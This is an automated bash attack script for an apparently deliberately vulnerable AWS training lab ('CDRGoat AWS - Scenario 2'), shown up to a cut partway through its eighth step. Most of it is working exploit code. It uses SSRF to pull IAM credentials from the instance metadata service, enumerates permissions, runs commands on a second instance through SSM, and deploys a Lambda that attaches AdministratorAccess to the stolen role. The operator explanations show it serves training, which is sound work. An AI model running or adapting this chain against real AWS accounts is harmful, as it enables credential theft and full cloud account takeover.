#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \/ _ \/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

is_valid_ipv4() {
  local ip="$1" o1 o2 o3 o4
  [[ $ip =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || return 1
  IFS='.' read -r o1 o2 o3 o4 <<<"$ip"
  for o in "$o1" "$o2" "$o3" "$o4"; do
    [[ $o =~ ^[0-9]+$ ]] && (( o >= 0 && o <= 255 )) || return 1
  done
  return 0
}

try() {
  local desc="$1"; shift
  local rc
  set +e
  "$@" >/dev/null 2>&1
  rc=$?
  set -e
  if [ $rc -eq 0 ]; then
    printf "[%s] %s[OK]%s    %s\n" "$(date +%H:%M:%S)" "$GREEN" "$RESET" "$desc"
  else
    printf "[%s] %s[DENY]%s  %s\n" "$(date +%H:%M:%S)" "$RED" "$RESET" "$desc"
  fi
}

ssm_exec_stdout() {
  local instance_id="$1"; shift
  local comment="$1"; shift
  local commands_json="$1"; shift

  local cmd_id status tries=0
  local truncated_comment="${comment:0:100}"
  cmd_id="$(aws ssm send-command --profile "$PROFILE" \
    --document-name "AWS-RunShellScript" \
    --comment "$truncated_comment" \
    --instance-ids "$instance_id" \
    --parameters "commands=$commands_json" \
    --query 'Command.CommandId' \
    --output text)"

  while :; do
    status="$(aws ssm get-command-invocation --profile "$PROFILE" \
      --command-id "$cmd_id" \
      --instance-id "$instance_id" \
      --query 'Status' \
      --output text 2>/dev/null || echo 'InProgress')"

    case "$status" in
      Success|Failed|Cancelled|TimedOut) break ;;
      *) sleep 1 ;;
    esac

    tries=$((tries+1))
    [ "$tries" -gt 180 ] && break
  done

  aws ssm get-command-invocation --profile "$PROFILE" \
    --command-id "$cmd_id" \
    --instance-id "$instance_id" \
    --query 'StandardOutputContent' \
    --output text
}

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===           CDRGoat AWS - Scenario 2               ===" "${RESET}"
  printf "%sSSRF → IMDS Credential Theft → SSM Lateral Movement → Lambda Privilege Escalation%s\n\n" "${GREEN}" "${RESET}"
  printf "This automated attack script will:\n"
  printf "  • Step 1.  Exploit SSRF on EC2a to steal IMDS credentials\n"
  printf "  • Step 2.  Enumerate permissions of stolen IMDS credentials\n"
  printf "  • Step 3.  Lateral movement validation to EC2b\n"
  printf "  • Step 4.  Install AWS CLI on EC2b via SSM\n"
  printf "  • Step 5.  Review role and permissions assigned to EC2b\n"
  printf "  • Step 6.  Discover AttachRolePolicy permissions via SSM\n"
  printf "  • Step 7.  Create PrivEsc Lambda via SSM on EC2b\n"
  printf "  • Step 8.  Invoke PrivEsc Lambda for privilege escalation\n"
  printf "  • Step 9.  Verify escalated permissions from EC2a\n"
  printf "  • Step 10. Cleanup — delete PrivEsc Lambda\n"
}
banner

#############################################
# Preflight checks
#############################################
step "Preflight checks"
missing=0
for c in aws curl jq; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true

#############################################
# Step 1. Exploitation of Web SSRF, IMDS stealing
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Exploitation of Web SSRF, IMDS stealing  ===" "${RESET}"

step "Target selection"
while :; do
  read -r -p "Enter IP of vulnerable application: " TARGET_IP
  if is_valid_ipv4 "$TARGET_IP"; then
    ok "IP format looks valid: $TARGET_IP"
    break
  else
    err "Invalid IPv4 address. Expected dotted quad (e.g., 203.0.113.10). Try again."
  fi
done

TARGET="http://$TARGET_IP:8080/ssrf"

step "Probing $TARGET for SSRF reachability (expects HTTP 200)"
spin_start "Sending test request (url=http://127.0.0.1:8080)"
set +e
HTTP_CODE="$(curl -sS -m 8 --connect-timeout 4 -o /dev/null -w "%{http_code}" \
                  -G --data-urlencode url=http://127.0.0.1:8080 "$TARGET")"
CURL_RC=$?
set -e
spin_stop

if [ $CURL_RC -ne 0 ]; then
  err "curl failed (exit $CURL_RC). Check SG/NACL/route/DNS."
  exit 1
fi
if [ "$HTTP_CODE" != "200" ]; then
  err "Endpoint responded with HTTP $HTTP_CODE (expected 200). Aborting."
  exit 1
fi
ok "SSRF endpoint reachable (HTTP 200) — proceeding."

step "Verification of SSRF exploitation"
spin_start "Requesting role name from IMDS via SSRF"
TARGET_ROLE=$(curl -sG --data-urlencode "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" "$TARGET")
spin_stop
ok "Discovered IAM role: $YELLOW$TARGET_ROLE$RESET"

spin_start "Fetching credentials for role $TARGET_ROLE via SSRF"
CREDS_JSON="$(curl -sG --data-urlencode "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/$TARGET_ROLE" "$TARGET")"
spin_stop

AKID=$(jq -r '.AccessKeyId'    <<<"$CREDS_JSON")
SECK=$(jq -r '.SecretAccessKey' <<<"$CREDS_JSON")
SESS=$(jq -r '.Token'           <<<"$CREDS_JSON")
EXP=$(jq -r '.Expiration'       <<<"$CREDS_JSON")

if [ -z "$AKID" ] || [ "$AKID" = "null" ]; then
  echo "Failed to parse creds JSON:" >&2
  echo "$CREDS_JSON" | sed -e 's/./&/120g' >&2
  exit 1
else
  ok "IMDS credentials successfully stolen"
  info "AccessKeyId: $AKID"
  info "Expiration : $EXP"
fi
spin_start "Configuring awscli profile"
PROFILE="streamgoat-scenario-2"
aws configure set aws_access_key_id     "$AKID"   --profile "$PROFILE"
aws configure set aws_secret_access_key "$SECK"   --profile "$PROFILE"
aws configure set aws_session_token     "$SESS"   --profile "$PROFILE"
aws configure set region                us-east-1 --profile "$PROFILE"
spin_stop
printf "\n"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We exploited a Server-Side Request Forgery (SSRF) vulnerability to access IMDS.\n\n"
printf "Unlike RCE, SSRF tricks the server into making requests on our behalf:\n"
printf "  • ${MAGENTA}First request${RESET}: Retrieved IAM role name from IMDS\n"
printf "  • ${MAGENTA}Second request${RESET}: Fetched full credentials for that role\n\n"
printf "SSRF bypasses network security controls because the server's IP is trusted.\n"
printf "IMDSv1 makes this trivially exploitable (no session token required).\n\n"
read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 2. Permission enumeration for stolen IMDS
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 2. Permission enumeration for stolen IMDS  ===" "${RESET}"

step "Identifying stolen identity"
spin_start "Calling STS GetCallerIdentity"
CALLER_ID="$(aws sts get-caller-identity --profile "$PROFILE" --output json 2>/dev/null)"
spin_stop

if [ -n "$CALLER_ID" ]; then
  ok "Identity confirmed"
  printf "  • Account : %s%s%s\n" "$YELLOW" "$(echo "$CALLER_ID" | jq -r '.Account')" "$RESET"
  printf "  • ARN     : %s%s%s\n" "$YELLOW" "$(echo "$CALLER_ID" | jq -r '.Arn')" "$RESET"
  printf "  • UserId  : %s%s%s\n" "$YELLOW" "$(echo "$CALLER_ID" | jq -r '.UserId')" "$RESET"
fi

step "Probing permissions across AWS services"
try "List account aliases"  aws iam list-account-aliases --profile "$PROFILE"

try "EC2 DescribeInstances" aws ec2 describe-instances --max-items 5 --profile "$PROFILE"

printf "\n%s%s%s\n" "${BOLD}${MAGENTA}" "Discovered EC2 Instances" "${RESET}"
aws ec2 describe-instances --profile "$PROFILE" \
  --filters "Name=tag:Name,Values=StreamGoat-aws2-*" \
            "Name=instance-state-name,Values=running" \
  --query 'Reservations[].Instances[].{Id:InstanceId,State:State.Name,PublicIP:PublicIpAddress,PrivateIP:PrivateIpAddress,Name: Tags[?Key==`Name`]|[0].Value}' \
  --output table

try "S3 ListAllMyBuckets"   aws s3api list-buckets --profile "$PROFILE"
try "Secrets ListSecrets"   aws secretsmanager list-secrets --max-results 5 --profile "$PROFILE"
try "SSM GetParametersByPath /" aws ssm get-parameters-by-path --path / --max-results 5 --profile "$PROFILE"
try "SSM DescribeInstances" aws ssm describe-instance-information --profile "$PROFILE"
try "KMS ListKeys"          aws kms list-keys --limit 5 --profile "$PROFILE"
try "ECR DescribeRepos"     aws ecr describe-repositories --max-results 5 --profile "$PROFILE"
try "Lambda ListFunctions"  aws lambda list-functions --max-items 5 --profile "$PROFILE"
try "DDB ListTables"        aws dynamodb list-tables --max-items 5 --profile "$PROFILE"
try "RDS DescribeDBs"       aws rds describe-db-instances --max-records 20 --profile "$PROFILE"
try "Logs DescribeLogGroups" aws logs describe-log-groups --limit 5 --profile "$PROFILE"
try "CloudTrail DescribeTrails" aws cloudtrail describe-trails --profile "$PROFILE"

printf "\n"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We performed permission enumeration using the stolen IMDS credentials.\n\n"
printf "The reconnaissance revealed:\n"
printf "  • ${MAGENTA}EC2 DescribeInstances${RESET}: Shows other instances (EC2b)\n"
printf "  • ${MAGENTA}SSM permissions${RESET}: Critical for lateral movement to EC2b\n\n"
printf "EC2b becomes our next target for pivoting deeper into the environment.\n\n"
read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 3. Lateral movement validation to EC2b
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 3. Lateral movement validation to EC2b  ===" "${RESET}"
printf "We are going to validate two permissions which may give us direct access to EC2b\n\n"

read IID AZ PUBIP <<<"$(aws ec2 describe-instances --profile "$PROFILE" \
  --filters 'Name=instance-state-name,Values=running' 'Name=tag:Name,Values=StreamGoat-aws2-EC2b' \
  --query 'Reservations[].Instances[][InstanceId,Placement.AvailabilityZone,PublicIpAddress]' \
  --output text | head -n1)"

: "${IID:?no instance found}"
: "${AZ:?no AZ found}"

# -------------------------
# (A) EC2 Instance Connect
# -------------------------
EIC_OSUSER="${EIC_OSUSER:-ubuntu}"

rm -f /tmp/streamgoat_eic_* 2>/dev/null || true
KEY=/tmp/streamgoat_eic_$$
ssh-keygen -t ed25519 -N '' -f "$KEY" -q

step "Attempting SSH key upload via EC2 Instance Connect"
try "EC2InstanceConnect SendSSHPublicKey ($EIC_OSUSER@$IID)" \
  aws ec2-instance-connect send-ssh-public-key --profile "$PROFILE" \
    --instance-id "$IID" \
    --availability-zone "$AZ" \
    --instance-os-user "$EIC_OSUSER" \
    --ssh-public-key "file://$KEY.pub" \
    --query Success --output text

# -------------------------
# (B) SSM Command Execution
# -------------------------
step "Attempting command execution via SSM SendCommand"
ssm_probe() {
  local iid="$1"
  local out rc cmdId

  set +e
  out="$(aws ssm send-command --profile "$PROFILE" \
          --document-name AWS-RunShellScript \
          --parameters commands='["whoami"]' \
          --instance-ids "$iid" \
          --comment "perm-probe $(date)" 2>&1)"
  rc=$?
  set -e

  if [ $rc -eq 0 ]; then
    cmdId="$(jq -r '.Command.CommandId' <<<"$out" 2>/dev/null)"
    try "SSM SendCommand permitted; CommandId=${cmdId:-<unknown>}" true
    sleep 3
    SSM_WHOAMI="$(aws ssm get-command-invocation --profile "$PROFILE" \
      --command-id "${cmdId}" --instance-id "$iid" \
      --query 'StandardOutputContent' --output text 2>/dev/null || true)"
    [ -n "$SSM_WHOAMI" ] && ok "Remote command 'whoami' returned: ${YELLOW}${SSM_WHOAMI}${RESET}"

  elif grep -qi 'TargetNotConnected' <<<"$out"; then
    try "SSM SendCommand allowed, but instance is not SSM-connected (agent/role/network)" true

  elif grep -qi 'AccessDenied' <<<"$out"; then
    try "SSM SendCommand not permitted (AccessDenied)" false

  else
    err "SSM SendCommand unexpected error (printing raw output below)"
    printf "%s\n" "$out"
  fi
}

ssm_probe "$IID"
printf "\n"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We validated two lateral movement methods:\n\n"
printf "  • ${MAGENTA}EC2 Instance Connect${RESET}: Upload SSH key for direct access\n"
printf "  • ${MAGENTA}SSM SendCommand${RESET}: Execute commands via AWS APIs\n\n"
printf "SSM is preferred because it works without inbound firewall rules.\n"
printf "We now have command execution on EC2b for further reconnaissance.\n\n"
read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 4. Installing AWS CLI on EC2b via SSM
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Installing AWS CLI on EC2b via SSM  ===" "${RESET}"

step "Installing AWS CLI v2 on EC2b via SSM SendCommand"
spin_start "Installing AWS CLI v2 on EC2b (this may take 60-90 seconds)"
INSTALL_OUT="$(ssm_exec_stdout "$IID" "Install awscli v2" \
  '["sudo apt-get update -y && sudo apt-get install -y unzip curl && curl -fsSL https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip -o /tmp/awscliv2.zip && unzip -q -o /tmp/awscliv2.zip -d /tmp && sudo /tmp/aws/install && rm -rf /tmp/aws /tmp/awscliv2.zip && aws --version"]')" || true
spin_stop
ok "AWS CLI installed on EC2b"
printf "\n"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We installed AWS CLI on EC2b via SSM to enumerate its permissions.\n\n"
printf "Each EC2 instance may have different IAM permissions. By pivoting to EC2b,\n"
printf "we gain access to a new set of capabilities that EC2a might not have.\n\n"
read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 5. Review role and permissions on EC2b
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. Review role and permissions assigned to EC2b  ===" "${RESET}"

step "Running 'aws sts get-caller-identity' on EC2b"
IDENTITY_OUT="$(ssm_exec_stdout "$IID" "GetCallerIdentity via awscli" \
  '["aws sts get-caller-identity"]')"
ROLE_NAME="$(echo "$IDENTITY_OUT" | jq -r '.Arn' | awk -F/ '{print $2}')"
ok "Discovered role name: $YELLOW$ROLE_NAME$RESET"

step "Listing inline policies for role: $ROLE_NAME"
POLICY_OUT="$(ssm_exec_stdout "$IID" "ListRolePolicies for EC2b Role" \
  "[\"aws iam list-role-policies --role-name $ROLE_NAME\"]")"
POLICY_NAME="$(echo "$POLICY_OUT" | jq -r '.PolicyNames[0]')"
ok "Discovered inline policy: $YELLOW$POLICY_NAME$RESET"

step "Reading policy $POLICY_NAME attached to $ROLE_NAME"
POLICY_CONTENT="$(ssm_exec_stdout "$IID" "GetRolePolicy to enumerate privileges" \
  "[\"aws iam get-role-policy --role-name $ROLE_NAME --policy-name $POLICY_NAME\"]")"

printf "\n%s%s%s\n" "${BOLD}${CYAN}" "Parsed Privileges in Inline Policy:" "${RESET}"
echo "$POLICY_CONTENT" | jq -r '.PolicyDocument.Statement[].Action'

printf "\n"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We discovered EC2b's IAM role has powerful permissions:\n\n"
printf "  • ${MAGENTA}lambda:CreateFunction${RESET}: Can create new Lambda functions\n"
printf "  • ${MAGENTA}iam:PassRole${RESET}: Can assign IAM roles to created resources\n"
printf "  • ${MAGENTA}lambda:InvokeFunction${RESET}: Can execute Lambda functions\n\n"
printf "With CreateFunction + PassRole, we can create a Lambda with a more\n"
printf "privileged role. If we find a role with iam:AttachRolePolicy,\n"
printf "we can escalate to admin.\n\n"
read -r -p "Step 5 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 6. Discovering AttachRolePolicy permissions via SSM
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. Discovering AttachRolePolicy permissions via SSM  ===" "${RESET}"

ROLE_PREFIX="StreamGoat-aws2-"

step "Listing roles with prefix ${ROLE_PREFIX}"
ROLES_JSON="$(ssm_exec_stdout "$IID" "List StreamGoat-aws2-* roles" \
  '["aws iam list-roles --query '\''Roles[?starts_with(RoleName, `StreamGoat-aws2-`)].RoleName'\'' --output json"]')"

if ! printf '%s' "$ROLES_JSON" | jq -e . >/dev/null 2>&1; then
  err "Failed to parse roles JSON"
  printf "Raw output:\n%s\n" "$ROLES_JSON"
  exit 1
fi

mapfile -t ROLES < <(printf '%s' "$ROLES_JSON" | jq -r '.[]' 2>/dev/null)
if ((${#ROLES[@]}==0)); then
  err "No roles found with prefix ${ROLE_PREFIX}"
  exit 0
fi

ok "Found ${#ROLES[@]} role(s)"

declare -A POLICIES

for role in "${ROLES[@]}"; do
  step "Listing inline policies for role: $role"

  out="$(ssm_exec_stdout "$IID" "List inline policies for $role" \
        "[\"aws iam list-role-policies --role-name $role --query PolicyNames --output json\"]")"

  if jq -e . >/dev/null 2>&1 <<<"$out"; then
    mapfile -t pols < <(jq -r '.[]' <<<"$out")
  else
    json_guess="$(grep -o '\[[^]]*\]' <<<"$out" | head -n1)"
    if [ -n "$json_guess" ] && jq -e . >/dev/null 2>&1 <<<"$json_guess"; then
      mapfile -t pols < <(jq -r '.[]' <<<"$json_guess")
    else
      err "Could not parse inline policy list for $role"
      pols=()
    fi
  fi

  if ((${#pols[@]} > 0)); then
    POLICIES["$role"]="$(printf '%s ' "${pols[@]}")"
    ok "Inline policies for $role: ${YELLOW}${POLICIES[$role]}${RESET}"
  else
    POLICIES["$role"]=""
    info "No inline policies attached to $role"
  fi
done

printf "\n%sPolicies map (role -> inline policies)%s\n" "$BOLD" "$RESET"
for role in "${!POLICIES[@]}"; do
  printf "  - %s: %s\n" "$role" "${POLICIES[$role]}"
done

jq_actions_filter='
  def toarr(x): if (x|type)=="array" then x else [x] end;
  (.PolicyDocument.Statement | toarr(.))[]
  | select(.Effect=="Allow")
  | .Action
  | toarr(.)
  | .[]
'

BEST_ROLE_EXACT=""
BEST_ROLE_ANY=""
declare -a HITS=()

for role in "${!POLICIES[@]}"; do
  read -r -a pnames <<<"${POLICIES[$role]}"
  [ ${#pnames[@]} -eq 0 ] && continue

  step "Inspecting inline policies on role: $role"
  for pn in "${pnames[@]}"; do
    [ -z "$pn" ] && continue

    out="$(ssm_exec_stdout "$IID" "GetRolePolicy $pn on $role" \
          "[\"aws iam get-role-policy --role-name $role --policy-name $pn --output json\"]")"

    actions="$(jq -r "$jq_actions_filter" <<<"$out" 2>/dev/null || true)"

    if printf '%s\n' "$actions" | grep -E -qi '^(iam:AttachRolePolicy|iam:\*|\*)$'; then
      while IFS= read -r a; do
        [[ "$a" =~ ^(iam:AttachRolePolicy|iam:\*|\*)$ ]] || continue
        printf "%s[HIT]%s role=%s policy=%s grants=%s\n" "$GREEN" "$RESET" "$role" "$pn" "$a"
        HITS+=("$role|$pn|$a")
        [ -z "$BEST_ROLE_ANY" ] && BEST_ROLE_ANY="$role"
        if [ "$a" = "iam:AttachRolePolicy" ] && [ -z "$BEST_ROLE_EXACT" ]; then
          BEST_ROLE_EXACT="$role"
        fi
      done <<<"$actions"
    else
      info "No Attach-like grants in $role/$pn"
    fi
  done
done

printf "\n%s%s%s\n" "${BOLD}${MAGENTA}" "Summary (inline policy hits)" "${RESET}"
if [ "${#HITS[@]}" -gt 0 ]; then
  for h in "${HITS[@]}"; do
    IFS='|' read -r r p a <<<"$h"
    printf "  role   = ${YELLOW}%s${RESET}\n  policy = ${YELLOW}%s${RESET}\n  action = ${YELLOW}%s${RESET}\n" "$r" "$p" "$a"
  done
  BEST_ROLE="${BEST_ROLE_EXACT:-$BEST_ROLE_ANY}"
  [ -n "$BEST_ROLE" ] && printf "\n  BEST_ROLE = %s\n" "${YELLOW}$BEST_ROLE${RESET}"
else
  printf "  (no inline policies granting iam:AttachRolePolicy / iam:* / *)\n"
fi
printf "\n"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We discovered a role with ${MAGENTA}iam:AttachRolePolicy${RESET} permission.\n\n"
printf "This permission allows attaching ANY managed policy (including\n"
printf "AdministratorAccess) to ANY role. Combined with iam:PassRole,\n"
printf "this enables full privilege escalation.\n\n"
printf "The discovered role will be used to create a privilege escalation Lambda.\n\n"
read -r -p "Step 6 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 7. PrivEsc Lambda creation via SSM
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 7. PrivEsc Lambda creation via SSM on EC2b  ===" "${RESET}"

printf "We are going to create a PrivEsc Lambda and assign ${YELLOW}$BEST_ROLE${RESET} role to it.\n"
printf "The Lambda will attach default AWS policy ${YELLOW}AdministratorAccess${RESET} to EC2a's role:\n"
printf "${YELLOW}import boto3

def lambda_handler(event, context):
    role = (event or {}).get('role_name', '$TARGET_ROLE')
    return boto3.client('iam').attach_role_policy(
        RoleName=role,
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )${RESET}\n\n"

: "${IID:?Missing EC2b instance-id (IID)}"
: "${BEST_ROLE:?BEST_ROLE is empty; run Step 6 to discover a role with iam:AttachRolePolicy}"

REGION="us-east-1"
LAMBDA_NAME="StreamGoat-aws2-PrivEsc-Lambda"

ACCOUNT="$(aws sts get-caller-identity --profile "$PROFILE" --query Account --output text)"
ROLE_ARN="arn:aws:iam::${ACCOUNT}:role/${BEST_ROLE}"
ok "Using execution role: ${YELLOW}${ROLE_ARN}${RESET}"

LAMBDA_SRC=$(cat <<PYCODE
import boto3

def lambda_handler(event, context):
    role = (event or {}).get('role_name', '$TARGET_ROLE')
    return boto3.client('iam').attach_role_policy(
        RoleName=role,
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
PYCODE
)

LAMBDA_B64="$(printf '%s' "$LAMBDA_SRC" | base64 | tr -d '\n')"

REMOTE_SCRIPT=$(cat <<'EOS'
set -euo pipefail

: "${LAMBDA_NAME:?missing LAMBDA_NAME}"
: "${ROLE_ARN:?missing ROLE_ARN}"
: "${REGION:?missing REGION}"
: "${LAMBDA_B64:?missing LAMBDA_B64}"

mkdir -p /tmp
echo "${LAMBDA_B64}" | base64 -d > /tmp/lambda_function.py

python3 - <<'PY'
import zipfile
z = zipfile.ZipFile('/tmp/function.zip','w',zipfile.ZIP_DEFLATED)
z.write('/tmp/lambda_function.py','lambda_function.py')
z.close()
PY

set +e
CREATE_OUT="$(aws lambda create-function \
  --function-name "${LAMBDA_NAME}" \
  --runtime python3.9 \
  --role "${ROLE_ARN}" \
  --handler lambda_function.lambda_handler \
  --zip-file fileb:///tmp/function.zip \
  --timeout 10 \
  --memory-size 128 \
  --region "${REGION}" 2>&1)"
RC=$?
set -e

if [ $RC -eq 0 ]; then
  echo "[OK] Created Lambda ${LAMBDA_NAME}"
else
  if echo "$CREATE_OUT" | grep -qi 'ResourceConflictException'; then
    echo "[i] Function exists; updating code…"
    aws lambda update-function-code \
      --function-name "${LAMBDA_NAME}" \
      --zip-file fileb:///tmp/function.zip \
      --region "${REGION}" \
      >/dev/null
  else
    echo "[ERR] Failed to create function:"
    echo "$CREATE_OUT"
    exit 1
  fi
fi

ARN="$(aws lambda get-function \
  --function-name "${LAMBDA_NAME}" \
  --region "${REGION}" \
  --query 'Configuration.FunctionArn' --output text)"
echo "FunctionArn=${ARN}"
EOS
)

RS_B64="$(printf '%s' "$REMOTE_SCRIPT" | base64 | tr -d '\n')"

commands_json="$(jq -cn \
  --arg LAMBDA_NAME "$LAMBDA_NAME" \
  --arg ROLE_ARN "$ROLE_ARN" \
  --arg REGION "$REGION" \
  --arg LAMBDA_B64 "$LAMBDA_B64" \
  --arg RS_B64 "$RS_B64" \
  '[
     "export LAMBDA_NAME=\($LAMBDA_NAME)",
     "export ROLE_ARN=\($ROLE_ARN)",
     "export REGION=\($REGION)",
     "export LAMBDA_B64=\($LAMBDA_B64)",
     "printf %s \($RS_B64) | base64 -d > /tmp/sg_step7.sh",
     "chmod +x /tmp/sg_step7.sh",
     "bash -lc /tmp/sg_step7.sh"
   ]'
)"

step "Creating Lambda '${LAMBDA_NAME}' on EC2b via SSM"
spin_start "Deploying PrivEsc Lambda function"
OUT="$(ssm_exec_stdout "$IID" "Create/Update ${LAMBDA_NAME}" "$commands_json")" || true
spin_stop
printf "%s\n" "$OUT" | sed -n '1,200p'
printf "\n"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We created a privilege escalation Lambda function.\n\n"
printf "The Lambda is assigned a role with ${MAGENTA}iam:AttachRolePolicy${RESET}.\n"
printf "When invoked, it will attach AdministratorAccess to EC2a's role.\n\n"
printf "This is a ${CYAN}confused deputy attack${RESET}: EC2b doesn't have AttachRolePolicy,\n"
printf "but it can create a Lambda with a role that does.\n\n"
read -r -p "Step 7 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 8. Invoke PrivEsc Lambda
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 8. Invoke PrivEsc Lambda via SSM on EC2b  ===" "${RESET}"

: "${IID:?Missing EC2b instance-id (IID)}"
: "${REGION:?Missing AWS region (REGION)}"
: "${LAMBDA_NAME:?Missing Lambda name (LAMBDA_NAME)}"

step "Invoking ${LAMBDA_NAME} to attach AdministratorAccess to $TARGET_ROLE"

commands_json="$(jq -cn \
  --arg LAMBDA_NAME "$LAMBDA_NAME" \
  --arg REGION "$REGION" \
  --arg TARGET_ROLE "$TARGET_ROLE" \
  --arg EVENT_B64 "$(printf '%s' "{\"role_name\":\"$TARGET_ROLE\"}" | base64 | tr -d '\n')" \
  --arg RS8_B64 "$(
    cat <<'EOS' | base64 | tr -d '\n'
set -euo pipefail
: "${LAMBDA_NAME:?missing LAMBDA_NAME}"
: "${REGION:?missing REGION}"
: "${TARGET_ROLE:?missing TARGET_ROLE}"
: "${EVENT_B64:?missing EVENT_B64}"

echo "${EVENT_B64}" | base64 -d > /tmp/sg_step8_event.json

aws lambda invoke \
  --function-name "${LAMBDA_NAME}" \
  --payload fileb:///tmp/sg_step8_event.json \
  --region "${REGION}" \
  /tmp/sg_step8_out.json

echo "[i] Verifying attached policies on role ${TARGET_ROLE}:"
aws iam list-attached-role-policies \
  --role-name "${TARGET_ROLE}" \
  --region "${REGION}" \
  --query "AttachedPolicies[].PolicyArn" \
  --output text
EOS
  )" \
  '[
     "export LAMBDA_NAME=\($LAMBDA_NAME)",
     "export REGION=\($REGION)",
     "export TARGET_ROLE=\($TARGET_ROLE)",
     "export EVENT_B64=\($EVENT_B64)",
     "printf %s \($RS8_B64) | base64 -d > /tmp/sg_step8.sh",
     "chmod +x /tmp/sg_step8.sh",
     "bash -lc /tmp/sg_step8.sh"
   ]'
)"

spin_start "Invoking Lambda and verifying policy attachment"
OUT="$(ssm_exec_stdout "$IID" "Invoke ${LAMBDA_NAME} & verify" "$commands_json")" || true
spin_stop
printf "%s\n" "$OUT" | sed -n '1,200p'

if printf '%s' "$OUT" | grep -q 'arn:aws:iam::aws:policy/AdministratorAccess'; then
  ok "AdministratorAccess is attached to $TARGET_ROLE"
elif printf '%s' "$OUT" | grep -qi 'AccessDenied\|ResourceNotFoundException\|AccessDeniedException'; then
  err "Lambda invoke or IAM attach failed (see output above for the AWS error)"
else
